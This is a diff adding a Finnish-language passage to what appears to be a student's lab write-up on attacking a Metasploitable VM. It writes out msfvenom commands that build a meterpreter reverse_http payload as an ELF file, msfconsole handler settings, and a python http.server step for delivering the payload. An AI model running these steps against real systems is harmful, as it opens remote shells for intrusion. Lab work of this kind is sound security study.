@@ -383,7 +383,33 @@ Oma ja Metasploitablen IP
 
 ![image](https://github.com/user-attachments/assets/e09db6d2-f70a-49ff-a7af-fb71a87872b9)
 
+Tässä välissä lueskelin, katselin videoita ja yritin saada parempaa kuvaa siitä, mitä pitää tehdä.
+Navigoin itseni /usr/bin, jossa msfvenom sijaitsee ja katselin aikani ```msfvenom -l payload``` - kohdasta linuxille sopivia payloadeja, jota tehtävässä kaivataan.
 
+- Ilmeisesti tuo tcp olisi helpompi vaihtoehto - mutta kiinnostaa enemmän jostain syystä kokeilla tuota reverse_http. Mennään siis sillä
+
+- Kokeilin [tämän](https://raxis.com/blog/cool-tools-series-msfvenom/) ohjeen mukaan suorittaa komennon ```msfvenom -p linux/x64/meterpreter_reverse_http LHOST=(omaip) LPORT=8080 (HTTP-PORTTI) -f exe > ~/Desktop/File.exe```
+- Se herjaa, että vain elf - fileja voi luoda
+- Eli vaihdoin sen ```sudo msfvenom -p linux/x64/meterpreter_reverse_http LHOST=(omaip) LPORT=8080 (HTTP-PORTTI) -f elf -o payload.elf
+
+![image](https://github.com/user-attachments/assets/05068cd6-8dff-4dd5-8af4-f54b4f717348)
+
+Seurailin vähän [ohjetta](https://www.beyondtrust.com/blog/entry/how-to-use-metasploit-for-command-control) ja käynnistin ```msfconsole```
+
+![image](https://github.com/user-attachments/assets/9965adfe-d957-46c3-a6a4-416266420ce1)
+
+Kuten näkyy, käytösä olisi shell_reverse_tcp, mutta halutaan se http, joten muokkaillaan niitä. Voi käytännössä copypasteta aikaisemmista komennoista, jos ei ole tyhjentänyt komentoja välissä
+
+```
+set payload (haluttu)
+set LHOST (Kali IP)
+set LPORT (Portti)
+exploit -j
+```
+
+Nyt hetken pohdin, et miten saan sen payloadin tuonne metasploitableen ja tuli mieleen [video](https://www.youtube.com/watch?v=ZqWfDrD2WVY), jonka näin aiemmin
+
+- Eli ```python3 -m http.server```
 
 
 ## Lähteet: 
